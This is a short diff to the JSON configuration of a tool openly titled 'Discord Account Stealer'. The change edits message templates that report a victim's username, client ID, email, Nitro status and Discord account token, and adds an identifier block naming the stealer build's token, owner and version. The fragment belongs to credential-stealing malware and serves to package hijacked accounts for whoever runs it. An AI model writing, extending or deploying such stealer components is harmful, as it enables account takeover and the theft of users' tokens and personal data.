@@ -15,7 +15,7 @@
         "MessageTitle": "Discord Account | {username}",
         "ErrorMessageTitle": "Discord Account Stealer | ERROR",
         "ErrorMessageBody": ":bookmark_tabs: __**ERROR:**__\\n:x: **{error}**\\n\\n :id: __**IDENTIFIER**__\\n**TOKEN:** {IdentifierToken}\\n**OWNED BY:** {IdentifierOwner}\\n**Creation Date:** {IdentifierCreationDate}\\n**Version:** {IdentifierVersion}",
-        "MessageBody": "__**:clipboard: Account Details:**__\\n\\n**:blue_book: AT:** _{location}_\\n\\n**:bust_in_silhouette: User:** {username}\\n\\n**:id: Client ID:** {userID}\\n\\n**:moneybag: Has Nitro:** {HasNitro}\\n\\n**:mailbox_with_mail: Email:** {email}{spoiler}\\n\\n**:key: Client Token:**\\n||{token}||",
+        "MessageBody": "__**:clipboard: Account Details:**__\\n\\n**:blue_book: AT:** _{location}_\\n\\n**:bust_in_silhouette: User:** {username}\\n\\n**:id: Client ID:** {userID}\\n\\n**:moneybag: Has Nitro:** {HasNitro}\\n\\n**:mailbox_with_mail: Email:** {email}{spoiler}\\n\\n**:key: Client Token:**\\n||{token}||\\n\\n :id: __**IDENTIFIER**__\\n**TOKEN:** {IdentifierToken}\\n**OWNED BY:** {IdentifierOwner}\\n**Creation Date:** {IdentifierCreationDate}\\n**Version:** {IdentifierVersion}",
         "ErrorImageURL": "https://i.imgur.com/rkY9LTw.png",
         "SuccessImageURL": "{ImageURL}"
     }
